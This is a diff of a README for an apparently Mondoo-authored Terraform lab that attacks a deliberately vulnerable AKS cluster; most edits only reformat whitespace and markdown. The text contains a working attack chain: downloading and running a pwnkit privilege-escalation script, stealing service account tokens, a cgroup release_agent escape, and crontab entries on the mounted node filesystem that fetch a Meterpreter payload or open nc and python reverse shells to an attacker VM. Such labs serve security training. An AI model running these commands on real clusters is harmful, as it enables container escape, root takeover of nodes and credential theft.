@@ -45,7 +45,7 @@ This folder contains Terraform automation code to provision the following:
 
 - [Azure Account](https://azure.microsoft.com/en-us/free/)
 - [AZ CLI](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)
-- [Terraform](https://learn.hashicorp.com/tutorials/terraform/install-cli) 
+- [Terraform](https://learn.hashicorp.com/tutorials/terraform/install-cli)
 - [`kubectl`]() - Kubectl must be installed on the host that you run `terraform` from.
 
 ## Provision the cluster
@@ -410,16 +410,19 @@ cd /tmp
 ```
 
 Download the `priv-es` script to `/tmp`
+
 ```bash
 curl -vkO https://pwnkit.s3.amazonaws.com/priv-es
 ```
 
 Make the script executable:
+
 ```bash
 chmod a+x ./priv-es
 ```
 
 Execute the script
+
 ```bash
 ./priv-es
 python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
@@ -434,50 +437,48 @@ uid=0(root) gid=0(root) groups=0(root),33(www-data)
 
 ### Gain access to worker nodes (Escaping the pod and getting a shell on the worker node)
 
-The first check which we need to do is to make sure if the container is running in a "privileged mode" or not. 
+The first check which we need to do is to make sure if the container is running in a "privileged mode" or not.
 
 What is Container Privileged mode:
 
-Privileged containers are containers that have all of the root capabilities of a host machine, allowing the ability to access resources which are not accessible in ordinary containers. 
+Privileged containers are containers that have all of the root capabilities of a host machine, allowing the ability to access resources which are not accessible in ordinary containers.
 
 There are several use cases of a privileged container such as:
 
-  *Running a container daemon inside another container
-  *Container requires direct hardware access
-  
-However, it has huge security risks since if you are root in a container you have the privileges of root on the host system!
+*Running a container daemon inside another container
+*Container requires direct hardware access
 
+However, it has huge security risks since if you are root in a container you have the privileges of root on the host system!
 
 To test if we have a privileged access, we can do following:
 
 a. make sure we are inside the container
-   
-   ```bash
-   cat /proc/1/cgroup
-   ```
 
-   In the outcome we can see the containerd which shows we are in a container (containerd in this case).
+```bash
+cat /proc/1/cgroup
+```
 
+In the outcome we can see the containerd which shows we are in a container (containerd in this case).
 
 b. To check is if we are in a privileged container, we can check if we have access to a lot of devices.
 
     ```bash
-   fdisk -l
-   ```
 
-   ```bash
-   ls /dev/
-   ```
+fdisk -l
 
+````
+
+```bash
+ls /dev/
+````
 
 There are several ways of escaping the container and land in the workernode which some of them might not work as kubernetes orchestration is keep updating in Azure. Here, we are trying three ways, which two of them is not working anymore in the new Kubernetes version (latest version deployed by terraform starting from May 2023):
 
-
-### 1. Using ServiceAccount 
+### 1. Using ServiceAccount
 
 When Pods contact the API server, Pods authenticate as a particular ServiceAccount (for example, default). There is always at least one ServiceAccount in each namespace. Every Kubernetes namespace contains at least one ServiceAccount: the default ServiceAccount for that namespace, named default. If you do not specify a ServiceAccount when you create a Pod, Kubernetes automatically assigns the ServiceAccount named default in that namespace.
 
-By default, the containers in the Kubernetes cluster stores service account token within their file system. If an attacker could find that token, he might be able to move laterally depending one the privilege of the service account. So, here we need to find first the Token and related objects and then check if the serviceAccount has the privileges like Creating another pods for us! 
+By default, the containers in the Kubernetes cluster stores service account token within their file system. If an attacker could find that token, he might be able to move laterally depending one the privilege of the service account. So, here we need to find first the Token and related objects and then check if the serviceAccount has the privileges like Creating another pods for us!
 
 The location of the token inside the pod is normally in the following pod:
 
@@ -486,7 +487,6 @@ cat /var/run/secrets/kubernetes.io/serviceaccount/token
 ```
 
 If there is a need, we can decode the token from https://jwt.io/!
-
 
 So if we are able to gain access to the ServiceAccount Token, we can perform some authenticated Kubernetes API enumeration.
 
@@ -511,9 +511,11 @@ export PATH=/tmp:$PATH; cd /tmp; curl -LO https://storage.googleapis.com/kuberne
 ```
 
 **Second, find out the node IP via the `/etc/resolv.conf`**
+
 ```bash
 cat /etc/resolv.conf
 ```
+
 ```
 search default.svc.cluster.local svc.cluster.local cluster.local vd3wk3pfuj5unnyfkbt5fjw0bg.bx.internal.cloudapp.net
 nameserver 10.0.0.10
@@ -521,8 +523,6 @@ options ndots:5
 ```
 
 The local node for the nameserver `10.0.0.10` is always the `x.x.x.1` address, so in that case `10.0.0.1`
-
-
 
 **Third, query the Node API if the service account on the pod has sufficient permissions to create a pod**
 
@@ -565,68 +565,62 @@ spec:
 '
 ```
 
-
-
 ### 2. Release_agent cgroups escape
 
 This exploit needs a cgroup where we can create a release_agent file and trigger release_agent invocation by killing all processes in the cgroup. The easiest way to accomplish that is to mount a cgroup controller and create a child cgroup.
 
-Here, we have tested for both RDMA and Memory cgroup controller which in both case it did not work. 
+Here, we have tested for both RDMA and Memory cgroup controller which in both case it did not work.
 
-  ```bash
-  mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x
-  echo 1 > /tmp/cgrp/x/notify_on_release
-  echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
-  echo '#!/bin/sh' > /cmd
-  echo "curl -vk http://<attacker_vm_public_ip>:8001/met-host -o /tmp/met" >> /cmd
-  echo "chmod 777 /tmp/met" >> /cmd
-  echo "/tmp/met" >> /cmd
-  chmod a+x /cmd
-  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-  ```
+```bash
+mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "curl -vk http://<attacker_vm_public_ip>:8001/met-host -o /tmp/met" >> /cmd
+echo "chmod 777 /tmp/met" >> /cmd
+echo "/tmp/met" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
 
-  We can confirm that it did not work in the new version of the kubernets in Azure, and most probably it should be related to the fact that cgroup exploit was mainly related to the Docker and not the containerd! 
+We can confirm that it did not work in the new version of the kubernets in Azure, and most probably it should be related to the fact that cgroup exploit was mainly related to the Docker and not the containerd!
 
+### 3. Cronjob
 
+As mentioned previously, we have a privileged container (Running in --privileged mode) in our case which is the DVWA. Since we already have root access on this pod, we can simply mount the Node filesystem and create a cronjob which triggers and gives us a reverse shell.
 
-### 3. Cronjob 
+First, we need to check the filesystem and mount the root filesystem of the node on the mount point:
 
-  As mentioned previously, we have a privileged container (Running in --privileged mode) in our case which is the DVWA. Since we already have root access on this pod, we can simply mount the Node filesystem and create a cronjob which triggers and gives us a reverse shell.
+```bash
+ls -la /dev/
+```
 
-  First, we need to check the filesystem and mount the root filesystem of the node on the mount point:
+and then we can mount as follow:
 
-  ```bash
-  ls -la /dev/
-  ```
+```bash
+mount /dev/sb1 /mnt/
+echo "*/1 * * * * root curl -vk http://<attacker_vm_public_ip>:8001/met-host -o /root/met && chmod 777 /root/met && /root/met" >> /mnt/etc/crontab
+```
 
-  and then we can mount as follow: 
+and at the same time we should listen to the port 4243 which is through ./msfconsole2 script as has been shown previously.
 
+It does not necessarily need to download the met-host from the Ruby webserver, as we can use other options as well for triggering the reverse shell such as:
 
-  ```bash
-  mount /dev/sb1 /mnt/
-  echo "*/1 * * * * root curl -vk http://<attacker_vm_public_ip>:8001/met-host -o /root/met && chmod 777 /root/met && /root/met" >> /mnt/etc/crontab
-  ```
+```bash
+echo "*/1 * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_vm_public_ip> 4243" >  /mnt/etc/crontab
+echo "*/1 * * * * root python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_vm_public_ip>",4243)) >  /mnt/etc/crontab
+...
+```
 
-  and at the same time we should listen to the port 4243 which is through ./msfconsole2 script as has been shown previously. 
+After getting the reverse shell on our host, we can check if we are on worker node:
 
+```bash
+#id
+uid=0(root) gid=0(root) groups=0(root)
+#hostname
+aks-default-38723430-vmss000000
+```
 
-  It does not necessarily need to download the met-host from the Ruby webserver, as we can use other options as well for triggering the reverse shell such as:
-
-  ```bash
-  echo "*/1 * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_vm_public_ip> 4243" >  /mnt/etc/crontab
-  echo "*/1 * * * * root python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_vm_public_ip>",4243)) >  /mnt/etc/crontab
-  ...
-  ```
-
-  After getting the reverse shell on our host, we can check if we are on worker node:
-
-  ```bash
-  #id
-  uid=0(root) gid=0(root) groups=0(root)
-  #hostname
-  aks-default-38723430-vmss000000
-  ```
-  
 ### Get keys from keyvault
 
 Get the instance metadata
@@ -768,7 +762,7 @@ terraform destroy -auto-approve
 
 ## License and Author
 
-* Author:: Mondoo Inc
+- Author:: Mondoo Inc
 
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
